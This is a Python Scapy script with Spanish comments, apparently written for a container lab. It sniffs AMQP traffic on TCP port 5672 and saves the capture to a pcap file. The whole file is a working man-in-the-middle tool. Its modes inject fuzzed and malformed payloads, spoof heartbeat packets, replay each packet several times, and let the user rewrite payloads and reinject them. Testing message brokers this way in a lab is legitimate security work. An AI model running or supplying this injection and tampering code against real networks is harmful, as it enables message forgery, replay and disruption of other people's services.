from scapy.all import *
import random
import sys

OUTPUT = "/captures/trace_mitm.pcap"

# Elige interfaz como antes...
interfaces = get_if_list()
print("Interfaces detectadas en este contenedor:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)
input_str = input("\nElige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_str.isdigit() and 1 <= int(input_str) <= len(interfaces) else input_str)

# Elige modo de ataque
print("\nModos disponibles: malicioso, dupe, raw, intercept")
MODO = input("Elige el modo: ").strip().lower()

captured_packets = []
modificados = 0

def send_pkt(pkt):
    if pkt.haslayer('IP'):
        del pkt['IP'].chksum
        del pkt['IP'].len
    if pkt.haslayer('TCP'):
        del pkt['TCP'].chksum
    sendp(pkt, iface=IFACE, verbose=False)

def modo_malicioso(pkt):
    global modificados
    # FUZZED
    pkt_fuzz = pkt.copy()
    if pkt_fuzz.haslayer(Raw):
        pkt_fuzz[Raw].load = bytes(random.getrandbits(8) for _ in range(random.randint(16, 2048)))
        print("[MALICIOSO] Enviando paquete FUZZED")
        send_pkt(pkt_fuzz)
        modificados += 1
    # MALFORMED
    pkt_malformed = pkt.copy()
    if pkt_malformed.haslayer(Raw):
        pkt_malformed[Raw].load = b"\x01\x02BADFRAME\xff" + pkt_malformed[Raw].load
        print("[MALICIOSO] Enviando paquete MALFORMED")
        send_pkt(pkt_malformed)
        modificados += 1
    # HEARTBEAT SPAM
    for i in range(3):
        heartbeat = IP(src=pkt[IP].src, dst=pkt[IP].dst)/TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags='PA')/Raw(b'\x08\x00\x00\x00\x00\x00\x00\xce')
        print("[MALICIOSO] Enviando paquete HEARTBEAT SPAM")
        send_pkt(heartbeat)
        modificados += 1

def modo_dupe(pkt):
    global modificados
    for i in range(5):  # Duplicar 5 veces
        pkt_dupe = pkt.copy()
        # Opcional: forzar IP origen a la del sender (ajusta según tu red)
        # pkt_dupe[IP].src = "192.168.20.3"
        print(f"[DUPE] Enviando duplicado {i+1}/5")
        send_pkt(pkt_dupe)
        modificados += 1

def modo_raw(pkt):
    global modificados
    if pkt.haslayer(Raw):
        old = pkt[Raw].load
        print("[RAW] Contenido hexadecimal original:", old.hex())
        nuevo = input("Ingresa nuevo payload HEX (ENTER para mantener): ").strip()
        if nuevo:
            pkt[Raw].load = bytes.fromhex(nuevo)
            print("[RAW] Payload modificado y reenviado")
            send_pkt(pkt)
            modificados += 1

def modo_intercept(pkt):
    global modificados
    if pkt.haslayer(Raw):
        old = pkt[Raw].load
        print("[INTERCEPT] Payload detectado:", old)
        nuevo = input("Nuevo payload (ENTER para mantener): ").encode() or old
        pkt[Raw].load = nuevo
        print("[INTERCEPT] Payload modificado y reenviado")
        send_pkt(pkt)
        modificados += 1

def process(pkt):
    print(f"\nPaquete capturado: {pkt.summary()}", flush=True)
    captured_packets.append(pkt)
    if MODO == "malicioso":
        modo_malicioso(pkt)
    elif MODO == "dupe":
        modo_dupe(pkt)
    elif MODO == "raw":
        modo_raw(pkt)
    elif MODO == "intercept":
        modo_intercept(pkt)
    else:
        print("[INFO] Modo desconocido, solo logging.")

FILTER = "tcp port 5672"
print(f"\nSniffing MITM en {IFACE} | filtro: {FILTER}\n", flush=True)
sniff(filter=FILTER, iface=IFACE, prn=process, timeout=60)

wrpcap(OUTPUT, captured_packets)
print(f"\nGuardado {len(captured_packets)} paquetes en {OUTPUT}", flush=True)
print(f"Paquetes modificados/enviados: {modificados}", flush=True)
